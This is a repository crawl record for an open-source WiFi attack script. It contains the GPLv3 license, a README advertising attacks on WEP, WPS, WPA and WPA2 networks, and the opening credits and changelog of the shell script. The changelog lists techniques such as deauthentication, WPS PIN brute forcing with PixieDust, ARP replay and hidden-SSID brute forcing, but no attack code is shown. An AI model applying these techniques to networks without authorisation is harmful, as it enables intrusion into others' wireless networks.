{
  "metadata": {
    "timestamp": 1736568326260,
    "page": 251,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjI2MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "esc0rtd3w/wifi-hacker",
      "stars": 2443,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3203125,
          "content": "\n\n                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    {one line to give the program's name and a brief idea of what it does.}\n    Copyright (C) {year}  {name of author}\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    {project}  Copyright (C) {year}  {fullname}\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<http://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<http://www.gnu.org/philosophy/why-not-lgpl.html>.\n\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 0.880859375,
          "content": "Shell Script For Attacking Wireless Connections Using Built-In Kali Tools. Supports All Securities (WEP, WPS, WPA, WPA2)\n\n\n![Image](http://i.imgur.com/AjQIOik.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/VK4Jd4v.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/92EReev.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/U7GG5qz.jpg)\n<br/><br/>\n![WEP](http://i.imgur.com/LF1g15f.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/80ImpOo.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/aBQVYqe.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/8IA7NSg.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/ItblUIv.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/msIXnMB.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/KEwNXH6.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/WOKuzWc.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/O8V5zLn.jpg)\n<br/><br/>\n![Image](http://i.imgur.com/I1XYuIu.jpg)\n<br/><br/>\n![EXTRAS](http://i.imgur.com/mqJpIAI.jpg)\n<br/><br/>\n"
        },
        {
          "name": "wifi-hacker.sh",
          "type": "blob",
          "size": 133.923828125,
          "content": "#!/bin/bash\n\n\n############################################################################\n#   CREDITS BEGIN   ########################################################\n############################################################################\n\n\n# WiFi Hacker v2.0\n# esc0rtd3w 2019\n\n# https://github.com/esc0rtd3w/wifi-hacker/\n\n# Uses parts of the aircrack-ng suite, reaver, wifite, and many other tools\n\n\n############################################################################\n#   CREDITS END   ##########################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   VERSION HISTORY BEGIN   ################################################\n############################################################################\n\n# v2.0\n# - Added support for new Gnome terminal options. Tested in Kali 2018.4\n\n# v1.9\n# - Added support for Wash. Currently used for dumping scan info out to text.\n# - Added \"Bruteforce Hidden SSID Options\" To Extras Menu and updated bruteforceHiddenSSID() Function.\n# - Updated Menu Navigation to restrict from entering Extras Menu until after a wireless adapter has been selected.\n# - Configured updates with new coloring, and now will only update if remote version is higher than local version.\n# - Cleaned up code for doSleepMessage() Function. Now takes 3 arguments, \"message\", \"time\", and \"color\".\n# - Updated Extras Menu. Added wpa_supplicant enable and disable options. Updated wpa_cli options.\n# - Updated Reaver save session to only save a backup if current session file exists.\n# - Fixed and updated Reaver output post screen that was broken in the last release version.\n\n# v1.8\n# - Cleaned up scripting and moved all global hotkey triggers to a loadMenuHotkeys Function.\n# - Added a bruteforceHiddenSSID() Function to handle hidden SSID name reveals.\n# - Added logging to XML file from airodump-ng when scanning Access Points for all encryption types.\n# - Added automatic 10 second timeout for Update Menu to continue to main menu for attacking.\n# - Fixed Update Menu. \"Check For Update\" and \"Apply New Update\" are now functional.\n# - Update Menu now loads automatically after accepting license agreement.\n# - Added support for parsing network adapter names for displaying when selecting adapter to use.\n# - Added a check for PixieWPS attacks. If failed, will now default to normal Reaver attack.\n\n# v1.7\n# - Currently supports up to 10 wifi adapters.\n# - Changed hotkey for \"Manual Adapter Entry\" from \"M\" to \"C\", because of conflicting with main menu hotkey\n# - Added adapter check after disclaimer is agreed, so the main menu will show the correct number of adapters.\n# - Updated \"killCounterMax\" to use \"interfacesFound\" value for \"stopMonitorMode()\" function\n# - Added \"checkMultipleAdapters\" Function\n# - Added number of interfaces displayed on stats banner.\n# - Fixed \"Interface Name\" on stats banner.\n# - Updated airodump-ng scripting for several functions.\n# - Fixed PixieDust toggles. They were reversed, disable turned on and vice/versa.\n# - Updated airodump-ng windows to only scan for the encryption type that is currently being targeted.\n\n# v1.6\n# - Added a \"forceDisconnectWiFi\" function to help fix active internet connection issues.\n# - Changed the handling of \"WiFi Force Disconnect\". Now, after accepting the agreement, the main menu will only load if the connection status is \"0\". If the status is \"1\", meaning the WiFi is connected to an access point, the \"forceDisconnectWiFi\" and \"checkNetworkStatus\" functions are called until the connection is released. This allows for better control of correcting errors resulting in having an active network connection.\n# - Added \"ifconfig\" and \"iwconfig\" output to Extras Interface Menu\n# - Merged \"checkForEmptyBSSID\", \"checkForEmptyESSID\", and \"checkForEmptyChannel\" into \"checkForEmptyCredentials\" function.\n# - Removed \"arAttackDeAuthOnRetry\" function. This was a duplicate and now uses \"arAttackDeAuth\" function instead.\n# - Cleaned up \"stopMonitorMode\" function.\n# - Added support for bully, used for WPS attacks.\n# - Fixed issue with active network connection not force disconnecting before attacks begin.\n# - Updated text for several menus.\n# - Fixed (mostly) the issue with backup ZIP files overwriting old backups.\n\n# v1.5\n# - Updated code to handle new cleaning invoked backup options for \"backupSessionFiles\" function.\n# - Added progress text for \"cleanCaptureFiles\", \"cleanSessionFiles\", and backupSessionFiles\" functions.\n# - Fixed \"Clean Session Files\" and Clean Capture Files\" options from Extras Menu.\n# - Now saving session files after Wifite Auto Attacks to prevent the .cap, .xor, etc files from being deleted.\n# - Updated minimal number of IVs to 5000 before cracking for Wifite WEP Auto Attacks.\n# - Fixed Wifite auto arguments for all encryption types.\n# - Updated Misc Menu Text\n# - Added \"aireplay-ng\" and \"packetforge-ng\" to dependency check.\n# - Added terminal background colors and updated foreground text color selection.\n# - Added a \"more\" option that can be typed under WEP Attack Menu. This menu has \"TCP Dump\", \"Generate ARP Packet\", \"Forge ARP Request\", and \"Replay ARP Request\" options.\n\n# v1.4\n# - Updated WPS attack to use PixieDust as a default option after 10 second timeout if no selection is made.\n# - 